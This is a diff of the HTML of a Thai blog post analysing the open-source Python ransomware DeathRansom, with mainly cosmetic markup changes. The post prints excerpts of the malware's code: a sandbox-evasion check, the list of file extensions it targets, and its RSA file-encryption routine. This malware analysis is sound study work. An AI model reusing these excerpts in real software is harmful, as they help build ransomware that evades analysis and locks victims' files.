@@ -61,9 +61,10 @@
 <meta property="og:title" content="Code Note 0x1: DeathRansom" />
 <meta property="og:description" content="Code Note คือชุดของบล็อกและโพสต์ซึ่งจะนำโค้ดของโปรแกรมจากโครงการโอเพนซอร์สมาทำการวิเคราะห์และทำความเข้าใจ ให้ความหมายและข้อเสนอแนะ โดย Code Note ในตอนแรกนี้จะเป็นการโค้ดจากโครงการมัลแวร์เรียกค่าไถ่แบบโอเพนซอร์ส DeathRansom มาทำการตรวจสอบและวิเคราะห์ครับ" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://pandora.sh/posts/code-note-0x1-deathransom/" />
+<meta property="og:url" content="https://pandora.sh/posts/code-note-0x1-deathransom/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2020-05-23T12:46:17+07:00" />
 <meta property="article:modified_time" content="2020-05-23T12:46:17+07:00" /><meta property="og:site_name" content="Pandora&#39;s Box" />
+
 
 
 
@@ -204,7 +205,7 @@
 </ul>
 <h1 id="project-overiew">Project Overiew</h1>
 <p>ข้อมูลจาก GitHub แสดงให้เห็นว่าโครงการนี้ทั้งหมดถูกพัฒนาด้วยโค้ดในภาษา Python เวอร์ชัน 2 และ 3 โครงการนี้มีโครงสร้างของไฟล์และไดเรกทอรีตามแผนภาพด้านล่างครับ</p>
-<pre><code>.
+<pre tabindex="0"><code>.
 ├── LICENSE
 ├── README.md
 ├── Ransom Request
@@ -267,7 +268,7 @@
 <ol>
 <li>ใช้การตรวจสอบหาโปรเซสจากรายการของโปรเซสที่มักพบใน sandbox หรือที่เกี่ยวข้องกับการวิเคราะห์มัลแวร์ด้วยฟังก์ชัน <code>check_sandbox_in_process()</code> กระบวนการนี้ใช้การตรวจสอบจากผลของการใช้คำสั่ง <code>tasklist</code> ไม่ได้เป็นการตรวจสอบจากผลลัพธ์ของการใช้ WinAPI</li>
 </ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check_sandbox_in_process</span>():
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check_sandbox_in_process</span>():
     EvidenceOfSandbox <span style="color:#f92672">=</span> []
     sandbox_processes <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;vmsrvc&#34;</span>, <span style="color:#e6db74">&#34;tcpview&#34;</span>, <span style="color:#e6db74">&#34;wireshark&#34;</span>, <span style="color:#e6db74">&#34;visual basic&#34;</span>, <span style="color:#e6db74">&#34;fiddler&#34;</span>, <span style="color:#e6db74">&#34;vmware&#34;</span>, <span style="color:#e6db74">&#34;vbox&#34;</span>, <span style="color:#e6db74">&#34;process explorer&#34;</span>, <span style="color:#e6db74">&#34;autoit&#34;</span>, <span style="color:#e6db74">&#34;vboxtray&#34;</span>, <span style="color:#e6db74">&#34;vmtools&#34;</span>, <span style="color:#e6db74">&#34;vmrawdsk&#34;</span>, <span style="color:#e6db74">&#34;vmusbmouse&#34;</span>, <span style="color:#e6db74">&#34;vmvss&#34;</span>, <span style="color:#e6db74">&#34;vmscsi&#34;</span>, <span style="color:#e6db74">&#34;vmxnet&#34;</span>, <span style="color:#e6db74">&#34;vmx_svga&#34;</span>, <span style="color:#e6db74">&#34;vmmemctl&#34;</span>, <span style="color:#e6db74">&#34;df5serv&#34;</span>, <span style="color:#e6db74">&#34;vboxservice&#34;</span>, <span style="color:#e6db74">&#34;vmhgfs&#34;</span>, <span style="color:#e6db74">&#34;vmtoolsd&#34;</span>
     runningProcess <span style="color:#f92672">=</span> []
@@ -281,9 +282,9 @@
                     <span style="color:#66d9ef">break</span>
 
     <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> EvidenceOfSandbox:
-        <span style="color:#66d9ef">return</span> True
+        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
     <span style="color:#66d9ef">else</span>:
-        <span style="color:#66d9ef">return</span> False
+        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
 </code></pre></div><ol start="2">
 <li>ฟังก์ชัน <code>check_sleep_acceleration()</code> ทำงานและส่งผลให้มัลแวร์จะหยุดกระบวนการทำงานเป็นเวลา 60 วินาที หลังจากช่วงเวลาดังกล่าวแล้วมัลแวร์จะทำการตรวจสอบเวลาจากเซิร์ฟเวอร์ NTP เพื่อระบุหาการทำ sleep acceleration ของ sandbox</li>
 </ol>
@@ -300,10 +301,10 @@
 <p>ฟังก์ชัน <code>anti_vm.check()</code> ทำงานเป็นฟังก์ชันสุดท้าย โดยฟังก์ชันใช้วืธีการระบุว่าโปรแกรมมัลแวร์ทำงานอยู้ใน virtualized environment หรือไม่ด้วยการตรวจสอบ MAC address ของเน็ตเวิร์กอินเตอร์เฟสว่ามีค่าตรงกับรายการที่ฝังมากับมัลแวร์หรือไม่ ค่า MAC address เหล่านี้โดยส่วนใหญ่เป็นของ MAC address ของซอฟต์แวร์ virtualization ซึ่งค่อนข้างตายตัวทั้งหมด</p>
 <h2 id="files-encryption">Files Encryption</h2>
 <p>ส่วนของโค้ดซึ่งเกี่ยวข้องกับการเข้ารหัสไฟล์จะถูกดำเนินการถัดมาหลังจากที่มัลแวร์ผ่านการตรวจสอบระบบเรียบร้อยแล้วในขั้นตอนก่อนหน้า โดยมัลแวร์จะถูกระบุให้ดำเนินการค้นหาไฟล์และเข้ารหัสเฉพาะภายใต้พาธ <code>%USERPROFILE%</code> รวมไปถึงมีการกำหนดนามสกุลของไฟล์ที่จะเข้ารหัสเอาไว้ด้วย</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">valid_extension <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;.pl&#34;</span>,<span style="color:#e6db74">&#34;.7z&#34;</span>,<span style="color:#e6db74">&#34;.rar&#34;</span>,<span style="color:#e6db74">&#34;.m4a&#34;</span>,<span style="color:#e6db74">&#34;.wma&#34;</span>,<span style="color:#e6db74">&#34;.avi&#34;</span>,<span style="color:#e6db74">&#34;.wmv&#34;</span>,<span style="color:#e6db74">&#34;.d3dbsp&#34;</span>,<span style="color:#e6db74">&#34;.sc2save&#34;</span>,<span style="color:#e6db74">&#34;.sie&#34;</span>,<span style="color:#e6db74">&#34;.sum&#34;</span>,<span style="color:#e6db74">&#34;.bkp&#34;</span>,<span style="color:#e6db74">&#34;.flv&#34;</span>,<span style="color:#e6db74">&#34;.js&#34;</span>,<span style="color:#e6db74">&#34;.raw&#34;</span>,<span style="color:#e6db74">&#34;.jpeg&#34;</span>,<span style="color:#e6db74">&#34;.tar&#34;</span>,<span style="color:#e6db74">&#34;.zip&#34;</span>,<span style="color:#e6db74">&#34;.tar.gz&#34;</span>,<span style="color:#e6db74">&#34;.cmd&#34;</span>,<span style="color:#e6db74">&#34;.key&#34;</span>,<span style="color:#e6db74">&#34;.DOT&#34;</span>,<span style="color:#e6db74">&#34;.docm&#34;</span>,<span style="color:#e6db74">&#34;.txt&#34;</span>, <span style="color:#e6db74">&#34;.doc&#34;</span>, <span style="color:#e6db74">&#34;.docx&#34;</span>, <span style="color:#e6db74">&#34;.xls&#34;</span>, <span style="color:#e6db74">&#34;.xlsx&#34;</span>, <span style="color:#e6db74">&#34;.ppt&#34;</span>, <span style="color:#e6db74">&#34;.pptx&#34;</span>, <span style="color:#e6db74">&#34;.odt&#34;</span>, <span style="color:#e6db74">&#34;.jpg&#34;</span>, <span style="color:#e6db74">&#34;.png&#34;</span>, <span style="color:#e6db74">&#34;.csv&#34;</span>, <span style="color:#e6db74">&#34;.sql&#34;</span>, <span style="color:#e6db74">&#34;.mdb&#34;</span>, <span style="color:#e6db74">&#34;.sln&#34;</span>, <span style="color:#e6db74">&#34;.php&#34;</span>, <span style="color:#e6db74">&#34;.asp&#34;</span>, <span style="color:#e6db74">&#34;.aspx&#34;</span>, <span style="color:#e6db74">&#34;.html&#34;</span>, <span style="color:#e6db74">&#34;.xml&#34;</span>, <span style="color:#e6db74">&#34;.psd&#34;</span>, <span style="color:#e6db74">&#34;.bmp&#34;</span>]
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">valid_extension <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;.pl&#34;</span>,<span style="color:#e6db74">&#34;.7z&#34;</span>,<span style="color:#e6db74">&#34;.rar&#34;</span>,<span style="color:#e6db74">&#34;.m4a&#34;</span>,<span style="color:#e6db74">&#34;.wma&#34;</span>,<span style="color:#e6db74">&#34;.avi&#34;</span>,<span style="color:#e6db74">&#34;.wmv&#34;</span>,<span style="color:#e6db74">&#34;.d3dbsp&#34;</span>,<span style="color:#e6db74">&#34;.sc2save&#34;</span>,<span style="color:#e6db74">&#34;.sie&#34;</span>,<span style="color:#e6db74">&#34;.sum&#34;</span>,<span style="color:#e6db74">&#34;.bkp&#34;</span>,<span style="color:#e6db74">&#34;.flv&#34;</span>,<span style="color:#e6db74">&#34;.js&#34;</span>,<span style="color:#e6db74">&#34;.raw&#34;</span>,<span style="color:#e6db74">&#34;.jpeg&#34;</span>,<span style="color:#e6db74">&#34;.tar&#34;</span>,<span style="color:#e6db74">&#34;.zip&#34;</span>,<span style="color:#e6db74">&#34;.tar.gz&#34;</span>,<span style="color:#e6db74">&#34;.cmd&#34;</span>,<span style="color:#e6db74">&#34;.key&#34;</span>,<span style="color:#e6db74">&#34;.DOT&#34;</span>,<span style="color:#e6db74">&#34;.docm&#34;</span>,<span style="color:#e6db74">&#34;.txt&#34;</span>, <span style="color:#e6db74">&#34;.doc&#34;</span>, <span style="color:#e6db74">&#34;.docx&#34;</span>, <span style="color:#e6db74">&#34;.xls&#34;</span>, <span style="color:#e6db74">&#34;.xlsx&#34;</span>, <span style="color:#e6db74">&#34;.ppt&#34;</span>, <span style="color:#e6db74">&#34;.pptx&#34;</span>, <span style="color:#e6db74">&#34;.odt&#34;</span>, <span style="color:#e6db74">&#34;.jpg&#34;</span>, <span style="color:#e6db74">&#34;.png&#34;</span>, <span style="color:#e6db74">&#34;.csv&#34;</span>, <span style="color:#e6db74">&#34;.sql&#34;</span>, <span style="color:#e6db74">&#34;.mdb&#34;</span>, <span style="color:#e6db74">&#34;.sln&#34;</span>, <span style="color:#e6db74">&#34;.php&#34;</span>, <span style="color:#e6db74">&#34;.asp&#34;</span>, <span style="color:#e6db74">&#34;.aspx&#34;</span>, <span style="color:#e6db74">&#34;.html&#34;</span>, <span style="color:#e6db74">&#34;.xml&#34;</span>, <span style="color:#e6db74">&#34;.psd&#34;</span>, <span style="color:#e6db74">&#34;.bmp&#34;</span>]
 </code></pre></div><p>มัลแวร์จะไม่เข้ารหัสไฟล์ที่ปรากฎนามสกุลไฟล์เป็น <code>.wannadie</code> ซึ่งหมายถึงไฟล์ที่ถูกเข้ารหัสโดย DeathRansom ไปแล้ว</p>
 <p>กระบวนการเข้ารหัสไฟล์จะเริ่มต้นโดยการเรียกใช้ฟังก์ชัน <code>rsa.encryptar()</code> ซึ่งมีการระบุพารามิเตอร์ 2 รายการ ได้แก่ พาธของไฟล์และค่ากุญแจสาธารณะของผู้โจมตีซึ่งถูกดาวโหลดมาจากอินเตอร์เน็ต</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encryptar</span>(FileName,public_key):
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encryptar</span>(FileName,public_key):
     <span style="color:#66d9ef">try</span>:
         public_key <span style="color:#f92672">=</span> RSA<span style="color:#f92672">.</span>importKey(public_key)
         encryptor <span style="color:#f92672">=</span> PKCS1_OAEP<span style="color:#f92672">.</span>new(public_key)
@@ -316,9 +317,9 @@
             output_file<span style="color:#f92672">.</span>write(encrypted)
             output_file<span style="color:#f92672">.</span>close()
         os<span style="color:#f92672">.</span>rename(FileName,OutputFile)
-        <span style="color:#66d9ef">return</span> True
+        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
     <span style="color:#66d9ef">except</span>:
-        <span style="color:#66d9ef">return</span> False
+        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
 </code></pre></div><p>ภายใต้ฟังก์ชัน <code>rsa.encryptar()</code> มัลแวร์เรียกค่าไถ่ DeathRansom จะดำเนินการเข้ารหัสไฟล์ตามขั้นตอนดังนี้</p>
 <ol>
 <li>มัลแวร์นำกุญแจสาธารณะของผู้โจมตีมาผ่านฟังก์ชันเพื่อสร้าง object สำหรับการเข้ารหัสข้อมูลด้วยอัลกอริธึม RSA แบบ PKCS#1 OAEP</li>
